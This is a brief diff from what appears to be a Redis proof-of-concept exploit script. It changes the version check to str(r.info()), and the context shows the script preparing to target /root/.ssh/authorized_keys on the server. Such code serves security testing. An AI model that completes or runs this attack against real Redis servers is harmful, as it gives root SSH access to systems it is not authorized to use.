@@ -69,7 +69,7 @@ class POC(Script):
 
             pool = redis.ConnectionPool(host=self.target_host, password=password, port=self.target_port)
             r = redis.Redis(connection_pool=pool)
-            if 'redis_version' in r.info():
+            if 'redis_version' in str(r.info()):
                 key = _random_string(10)
                 path = '/root/.ssh'
                 name = 'authorized_keys'
